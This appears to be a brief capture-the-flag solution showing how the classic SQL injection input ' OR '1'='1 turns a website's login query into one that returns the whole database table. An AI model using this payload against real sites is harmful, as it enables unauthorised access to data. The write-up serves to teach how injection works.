The website takes user input and puts it in an SQL query.

We want our input to be such that the query's login is true.
```
' OR '1'='1
```
The input will cause the SQL query to look as follows:
```
SELECT * FROM webfour.webfour where name = '' OR '1'='1'
```
As the `name` field is blank and 1 is always equal to 1, the entire database is leaked.
